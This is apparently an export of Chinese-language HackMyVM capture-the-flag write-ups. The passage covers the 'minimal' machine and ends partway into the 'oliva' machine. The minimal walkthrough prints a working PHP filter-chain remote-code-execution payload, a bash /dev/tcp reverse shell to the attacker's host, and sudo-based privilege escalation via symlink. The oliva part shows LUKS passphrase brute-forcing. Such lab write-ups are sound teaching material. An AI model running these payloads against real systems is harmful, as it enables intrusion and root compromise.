/tmp/a.sh\nhttp://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=chmod +x /tmp/a.sh\nhttp://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=bash%20/tmp/a.sh\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat shell.sh\nbash -i >& /dev/tcp/192.168.205.141/8888 0>&1                                   \n```\n\n\u6210\u529f\u5f39\u56de\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888        \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.135] 44534\nbash: cannot set terminal process group (750): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@minimal:/var/www/html$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@minimal:/var/www/html$ sudo -l\nMatching Defaults entries for www-data on minimal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser www-data may run the following commands on minimal:\n    (root) NOPASSWD: /opt/quiz/shop\nwww-data@minimal:/var/www/html$ ls -la /opt/quiz/shop\n-rwxrwxr-x 1 root root 16632 Nov  5  2023 /opt/quiz/shop\n\n```\n\n\u80fd`\u8bfb\u53d6\u3001\u6267\u884c`\uff0c\u4e0d\u80fd\u4fee\u6539(\u00d7\ufe4f\u00d7)\u3002\u6211\u4eec\u628a\u6587\u4ef6\u62d6\u53bb\u672c\u5730\u7528**IDA**\u770b\u770b\n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  __int64 v3; // rdi\n  _DWORD v5[4]; // [rsp+10h] [rbp-20h] BYREF\n  char *v6; // [rsp+20h] [rbp-10h]\n  char *s; // [rsp+28h] [rbp-8h]\n\n  strcpy((char *)v5, 'results.txt');\n  s = 'Hey guys, I have prepared this little program to find out how much you know about me, since I have been your admin'\n      'istrator for 2 years.';\n  v6 = 'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash';\n  puts(\n    'Hey guys, I have prepared this little program to find out how much you know about me, since I have been your adminis'\n    'trator for 2 years.');\n  puts(\n    'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash');\n  v5[3] = question_1(\n            'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you d'\n            'on't, you win trash');\n  v5[3] += question_2(\n             'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you '\n             'don't, you win trash');\n  v5[3] += question_3(\n             'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you '\n             'don't, you win trash');\n  v3 = (__int64)v5;\n  writeResults(v5, v5[3]);\n  if ( v5[3] == 3 )\n  {\n    v3 = 3LL;\n    print_prize(3LL);\n  }\n  if ( foo == 85 )\n    wait_what(v3);\n  return 0;\n}\n```\n\n\u4e3b\u8981\u662f\u5b9e\u73b0\u4e86\uff0c\u8ba9\u4f60\u56de\u7b543\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u56de\u7b54\u6b63\u786e\u4e86\uff0c\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u6cf0\u8fea\u718a\u3002\u6211\u4eec\u5c1d\u8bd5\u83b7\u53d6\u4e00\u4e0b\u95ee\u9898\u7684\u7b54\u6848\n\n![image](https://github.com/user-attachments/assets/e6f1496e-80f6-4b48-97ed-976913a92103)\n\nquestion_1\u7684\u7b54\u6848\u662f`linux`\n\n![image](https://github.com/user-attachments/assets/e17ea303-2bfe-45bc-aec3-3e29dffd0867)\n\nquestion_2\u7684\u7b54\u6848\u662f`gfhts ufshfpjx`\n\n![image](https://github.com/user-attachments/assets/5f0b1612-dbd7-48cb-9bcc-dd7e41076d35)\n\nquestion_3\u7684\u7b54\u6848\u662f`hpok&qorn&vjsaohu`\n\n![image](https://github.com/user-attachments/assets/3bdb6f71-68f0-4c42-8288-f7ec5337f1b4)\n\n\u7b2c2\u548c\u7b2c3\u4e2a\u662f\u9519\u7684\uff0c\u53ef\u80fd\u662f\u901a\u8fc7\u4e86\u52a0\u5bc6\uff0c\u4f46\u662f\u6211\u6ca1\u6709\u7cfb\u7edf\u7684\u5b66\u8fc7\u52a0\u5bc6\u7b97\u6cd5\u548c\u9006\u5411\uff0c\u6240\u4ee5\u53ea\u53ef\u4ee5\u6162\u6162\u8bd5\u4e86\n\n\u5148\u6709\u6536\u83b7\u7684\u662f\u7b2c3\u4e2a\uff0c\u662f\u4f7f\u7528\u4e86**XOR**\uff0c\u6211\u901a\u8fc7[cyberchef](https://cyberchef.org/)\u66b4\u529b\u7834\u89e3\u83b7\u5f97\u4e86\u51e0\u4e2a\u50cf\u5bc6\u7801\u7684\u5b57\u7b26\u4e32\n\n![image](https://github.com/user-attachments/assets/47f3df6a-6afd-47c9-8e17-d1001ec2e98b)\n\n\u6211\u901a\u8fc7\u63d0\u6743\u83b7\u5f97\u7684\u5b57\u5178\u8868\n\n```bash\nwww-data@minimal:/tmp$ awk -F ': ' '{print $2}' tmp2 \niqnj'pnso'wkr`nit\njrmi$smpl$thqcmjw\nkslh%rlqm%uipblkv\nltko'ukvj'rnweklq\nmujn#tjwk#sovdjmp\nnvim with plugins\nowhl!vhui!qmtfhor\n`xgc.ygzf.~b{ig`}\nayfb/xf{g/czhfa|\nbzea,{exd,|`ykeb\nc{d`-zdye-}axjdc~\nd|cg*}c~b*zfmcdy\ne}bf+|bc+{g~lbex\nf~ae(a|`(xd}oaf{\ng`d)~`}a)ye|n`gz\nx`{6ab~6fzcqxe\nya~z7`~c7g{bp~yd\nzb}y4c}`|4dxas}zg\n{c|x5b|a}5ey`r|{f\n|d{2e{fz2b~gu{|a\n}ez~3dzg{3cftz}`\n~fy}0gydx0`|ewy~c\ngx|1fxey1a}dvxb\nphws>iwjv>nrkywpm\nqivr?hvkw?osjxvql\nrjuq<kuht<lpi{uro\nsktp=jtiu=mqhztsn\ntlsw:msnr:jvo}sti\numrv;lros;kwn|ruh\nvnqu8oqlp8htmqvk\nwopt9npmq9iul~pwj\n```\n\n\u5199\u4e86\u4e2a\u5c0f\u811a\u672c\u8dd1\u4e00\u4e0b\uff08AI\u8f85\u52a9\uff09\n\n```bash\n#!/bin/bash\n\npassword_file='/tmp/tmp2'\n\nwhile IFS= read -r password; do\n  echo 'Trying password: $password'\n  \n  echo -e '$password\\n' | sudo /opt/quiz/shop > /tmp/output.txt\n  \n  if grep -q 'Correct!!' /tmp/output.txt; then\n    echo 'Password found: $password'\n    break\n  fi\ndone < '$password_file'\n```\n\n\u6267\u884c\n\n```bash\nwww-data@minimal:/tmp$ bash b.sh \nTrying password: iqnj'pnso'wkr`nit\nTrying password: jrmi$smpl$thqcmjw\nTrying password: kslh%rlqm%uipblkv\nTrying password: ltko'ukvj'rnweklq\nTrying password: mujn#tjwk#sovdjmp\nTrying password: nvim with plugins\nPassword found: nvim with plugins\n\n```\n\n\u7b2c\u4e09\u4e2a\u7b54\u6848\u662f\uff1a`nvim with plugins`\n\n\u7b2c\u4e8c\u4e2a\u7684\u7b54\u6848\uff0c\u7ec6\u7ec6\u54c1\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a'\u79d8\u5bc6'(\u7b2c\u4e09\u4e2a\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u83b7\u5f97\u52a0\u5bc6\u7684\u65b9\u6cd5)\n![image](https://github.com/user-attachments/assets/3903a8b9-2360-4ed3-b421-052babc11356)\n\n\u51ef\u6492\uff01\uff01\uff01\n\n![image](https://github.com/user-attachments/assets/b6e01404-1abc-485d-b4be-18726c675c3d)\n\n\u6240\u4ee5\u7b2c\u4e8c\u9898\u7684\u7b54\u6848\u662f\uff1a`bacon pancakes`\n\n```bash\nwww-data@minimal:/opt/quiz$ sudo /opt/quiz/shop\nHey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.\nIf you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash\nWhat is my favorite OS?\nlinux\nCorrect!!\nWhat is my favorite food?\nbacon pancakes\nCorrect!!\nWhat is my favorite text editor?\nnvim with plugins\nCorrect!!\nUser name: \nSaving results .\nHURRAY YOU HAVE FOUND ME\n _________________________________________________________\n|\\=========================================================\\\n||                                                         |\n||        _        __        ___        __        _        |\n||       ; `-.__.-'. `-.__.-'. .`-.__.-' .`-.__.-' :       |\n||     _.'. . . . . . . . .,,,,,,,. . . . . . . . .`._     |\n||   .'. . . . . . . . ,a@@@@@@@@@@@a, . . . . . . . .`.   |\n||   `. . . . ,a@@@@@a@@@a@@@@@@@@@a@@@a@@@@@a, . . . ,'   |\n||     ) . . a@@@@@@a@@@@@a@@@@@@@a@@@@@a@@@@@@a . . (     |\n||   ,' . . .@@@%%%a@@@@@@@@@@@@@@@@@@@@@a%%%@@@  . . `.   |\n||   `.. . . @@@%%a@@@@@@''@@@@@@@''@@@@@@a%%@@@ . . .,'   |\n||     ). . . '@@a@@@@@@@@@SSSSSSS@@@@@@@@@a@@' . . .(     |\n||   ,'. . . . . `@@@@@@@@SSS, ,SSS@@@@@@@@' . . . . .`.   |\n||   `. . . . . . `@@@@@@@`SSS:SSS'@@@@@@@' . . . . . ,'   |\n||     ) . . . . . `@@@@@@@sssssss@@@@@@@' . . . . . (     |\n||   ,' . . . . . ,a@@a@@@@@@@@@@@@@@@a@@a, . . . . . `.   |\n||   `.. . . . .a@@@a@@@@@a@@@a@@@a@@@@@a@@@a. . . . .,'   |\n||     ). . . .a@@@@@a@@@@@@@@@@@@@@@@@a@@@@@a. . . .(     |\n||   ,'. . . . @@@@@@a@@@@'   '   `@@@@a@@@@@@ . . . .`.   |\n||   `. . . . .@@@@@@@aaaa,       ,aaaa@@@@@@@  . . . ,'   |\n||     ) . . . `@@@@@@@@@@@@a, ,a@@@@@@@@@@@@' . . . (     |\n||   ,' . . . . .`@@@@@@@@@@a@a@a@@@@@@@@@@'. . . . . `.   |\n||   `;;;;;;;;;;;;aaaaaaaaaa@@@@@aaaaaaaaaa;;;;;;;;;;;;'   |\n||     );;;;;;;,mMMMMMMMm@@@@@@@@@@@mMMMMMMMm,;;;;;;;(     |\n||   ,;;;;;;;;a@%#%%#%%#%Mm@@@@@@@mM%#%%#%%#%@a;;;;;;;;,   |\n||   `;;;;;;;;@@%%%%%%%%%%M@@';'@@M%%%%%%%%%%@@;;;;;;;;'   |\n||     );;;;;;`@a%%%%%%%%mM';;;;;'Mm%%%%%%%%a@';;;;;;(     |\n||   ,;;;;;;;;;;'@@@@@@@@';;;;;;;;;'@@@@@@@@';;;;;;;;;;,   |\n||   `;;;;;;;;;;;;'''''';;;;;;;;;;;;;'''''';;;;;;;;;;;;'   |\n||     );;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-Catalyst(     |\n||     `:;;;:-~~~-:;;:-~~~-:;;;;;:-~~~-:;;:,-~~~-:;;;:'    |\n||       ~~~       ~~        ~~~        ~~        ~~~      |\n||                     .=============.                     |\n||                     |   Mr. Bear  :                     |\n||                     `-------------'                     |\n\\|_________________________________________________________|\n\n\nAnd now what??\n```\n\n\u6765\u4e4b\u4e0d\u6613\u7684\u6cf0\u8fea\u718a\uff0c\u7136\u540e\u518d\u770b\u4e0b**IDA**\u8fd9\u4e2a\u6cf0\u8fea\u718a\u600e\u4e48\u6765\u7684\n\n![image](https://github.com/user-attachments/assets/979a41d4-5417-4482-a112-f0321c3c3c3c)\n\n![image](https://github.com/user-attachments/assets/11520f4a-cb3a-4bd6-b69d-ddc0c742cdaa)\n\n\u662f\u67e5\u770b\u4e86`prize.txt`\u6587\u4ef6\uff0c\u90a3\u5c31\u7b80\u5355\u4e86\uff0c\u521b\u5efa\u4e00\u4e2a**\u8f6f\u94fe\u63a5**\u5c31\u597d\u4e86\n\n```bash\nwww-data@minimal:/opt/quiz$ ln -s prize.txt /root/root.txt\nln: failed to create symbolic link '/root/root.txt': Permission denied\n```\n\n\u86d9\u8da3\uff0c\u6ca1\u6743\u9650\uff0c\u7b49\u6211\u56de\u60f3\u4e86\u4e00\u4e0b\uff0c\u597d\u50cf\u8981\u53bb\u5bb6\u76ee\u5f55\uff0c\u4e4b\u524d\u770b\u7fa4\u4e3b`ll04567`\u90fd\u53ef\u4ee5\u5b9e\u73b0\uff0c\u518d\u8bd5\u8bd5\n\n```bash\nwww-data@minimal:/var/www/html$ ln -s /root/root.txt prize.txt \nwww-data@minimal:/var/www/html$ ls -al\ntotal 64\ndrwxr-xr-x 4 www-data www-data 4096 Jan 14 08:56 .\ndrwxr-xr-x 3 root     root     4096 Nov  1  2023 ..\n-rw-rw-r-- 1 www-data www-data 2964 Nov  1  2023 admin.php\n-rw-rw-r-- 1 www-data www-data  892 Nov  1  2023 buy.php\n-rw-r--r-- 1 www-data www-data  355 Nov  1  2023 config.php\ndrwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 imgs\n-rw-r--r-- 1 www-data www-data 2601 Nov  1  2023 index.php\n-rw-r--r-- 1 www-data www-data 1836 Nov  1  2023 login.php\n-rw-r--r-- 1 www-data www-data  321 Nov  1  2023 logout.php\nlrwxrwxrwx 1 www-data www-data   14 Jan 14 08:56 prize.txt -> /root/root.txt\n-rw-r--r-- 1 www-data www-data 2221 Nov  1  2023 register.php\n-rw-rw-r-- 1 www-data www-data 3621 Nov  1  2023 reset_pass.php\n-rw-r--r-- 1 www-data www-data  111 Nov  1  2023 restricted.php\n-rw-r--r-- 1 root     root       18 Jan 14 07:58 results.txt\n-rw-r--r-- 1 www-data www-data   12 Nov  1  2023 robots.txt\n-rw-rw-r-- 1 www-data www-data 2549 Nov  1  2023 shop_cart.php\ndrwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 styles\nwww-data@minimal:/var/www/html$ sudo /opt/quiz/shop\nHey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.\nIf you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash\nWhat is my favorite OS?\nlinux\nCorrect!!\nWhat is my favorite food?\nbacon pancakes\nCorrect!!\nWhat is my favorite text editor?\nnvim with plugins\nCorrect!!\nUser name: \nSaving results .\nHMV{xxxxxxxxxxxxx} \n\n```\n\n\u884c\u4e86\uff0c\u4e0b\u73ed\n\n![006mowZngy1gd6j0zxr0tg30as0bctww](assets/006mowZngy1gd6j0zxr0tg30as0bctww-20250114171159-n4ev1fr.gif)\n\n# 5.\u540e\u8bdd\n\n\u53bb\u770b\u4e86\u5176\u4ed6\u5927\u4f6c\u7684[wp](http://162.14.82.114/index.php/574/04/16/2024/)\uff0c\u53d1\u73b0\u8fd8\u53ef\u4ee5\u4f7f\u7528**\u6784\u9020 ROP \u94fe**\u7684\u65b9\u5f0f\u63d0\u6743\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u53bb\u770b`HGBE`\u5927\u4f6c\u7684[wp](http://162.14.82.114/index.php/574/04/16/2024/)sentence", "top": 0, "createdAt": 1751016803, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P109": {"htmlDir": "docs/post/hmv_oliva.html", "labels": ["HackMyVM"], "postTitle": "hmv_oliva", "postUrl": "post/hmv_oliva.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/109", "commentNum": 0, "wordCount": 6347, "description": "# hmv_oliva\n\n# 0. \u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - oliva](https://hackmyvm.eu/machines/machine.php?vm=oliva)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.138\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1. \u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 08:43 CST\nNmap scan report for 192.168.205.138\nHost is up (0.00029s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:84:83:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.44 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u542f\u4e86 **SSH** (22/tcp) \u548c **HTTP** (80/tcp) \u670d\u52a1\u3002\n\n# 2. \u8e29\u70b9\n\n\u8bbf\u95ee\u4e3b\u9875\u662f Nginx \u6b22\u8fce\u9875\u9762\uff0c\u6ca1\u6709\u53d1\u73b0\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md\n```\n\n\u7ed3\u679c\u663e\u793a\uff1a\n\n```\n200      GET    70541l   415824w 34717484c http://192.168.205.138/oliva\n200      GET        5l       10w       69c http://192.168.205.138/index.php\n200      GET       23l       75w      615c http://192.168.205.138/index.html\n```\n\n`http://192.168.205.138/oliva` \u662f\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fdb\u4e00\u6b65\u5206\u6790\u5b83\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ file oliva\noliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {'keyslots':{'0':{'type':'luks2','key_size':64,'af':{'type':'luks1','stripes':4000,'hash':'sha256'},'area':{'type':'raw','offse\n```\n\n`file` \u547d\u4ee4\u8f93\u51fa\u663e\u793a `oliva` \u662f\u4e00\u4e2a **LUKS (Linux Unified Key Setup) \u52a0\u5bc6\u6587\u4ef6**\uff0c\u6211\u4eec\u5c1d\u8bd5\u63d0\u53d6\u5b83\u7684\u54c8\u5e0c\u8fdb\u884c\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ luks2john oliva > hash\noliva : Only LUKS1 is supported. Used version: 2\n```\n\n`luks2john` \u5de5\u5177\u5f53\u524d\u53ea\u652f\u6301 LUKS \u7248\u672c 1\uff0c\u800c\u6211\u4eec\u7684\u6587\u4ef6\u662f LUKS \u7248\u672c 2 \u683c\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u53e6\u5bfb\u51fa\u8def\u3002\u627e\u5230\u4e86\u4e00\u7bc7[\u6587\u7ae0](https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases)\uff0c\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\n\n![Image](https://github.com/user-attachments/assets/922131df-15e3-4d27-9715-1823b19a4fbb)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo apt install bruteforce-luks -y\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ bruteforce-luks -t 4 -f /usr/share/wordlists/q5000.txt oliva\nPassword found: bebita\n```\n\n\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6210\u529f\u83b7\u5f97\u53e3\u4ee4 `bebita`\uff0c\u63a5\u4e0b\u6765\u6253\u5f00\u52a0\u5bc6\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo cryptsetup luksOpen oliva oliva\n\u8bf7\u8f93\u5165 oliva \u7684\u53e3\u4ee4\uff1abebita\n```\n\n\u67e5\u770b\u6587\u4ef6\u7cfb\u7edf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ lsblk\nNAME    MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINTS\nloop0     7:0    0 19.1M  0 loop  \n\u2514\u2500oliva 254:0    0  3.1M  0 crypt\n```\n\n\u6302\u8f7d\u5e76\u67e5\u770b\u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo mount /dev/mapper/oliva /mnt\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 18\ndrwxr-xr-x  3 root root  1024 2023\u5e74 7\u6708 4\u65e5 .\ndrwxr-xr-x 18 root root  4096 12\u6708 6\u65e5 19:03 ..\ndrwx------  2 root root 12288 2023\u5e74 7\u6708 4\u65e5 lost+found\n-rw-r--r--  1 root root    16 2023\u5e74 